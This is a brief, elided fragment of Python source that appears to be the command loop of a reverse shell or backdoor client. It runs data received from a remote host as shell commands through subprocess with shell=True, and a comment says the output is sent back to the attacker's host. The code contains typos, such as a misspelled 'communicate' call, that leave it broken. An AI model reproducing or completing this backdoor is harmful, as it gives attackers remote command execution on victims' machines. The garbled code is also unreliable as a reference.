...
while True:
	...
	#Execute the decoded data as a commond. The subprocess module is great because we can PIPE STDOUT/STDE/STDIN to variable
	comm = subprocess .Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	SDOUT, STDERR = comm.comminicate()

	#Encode the ouput and send to RHOUST
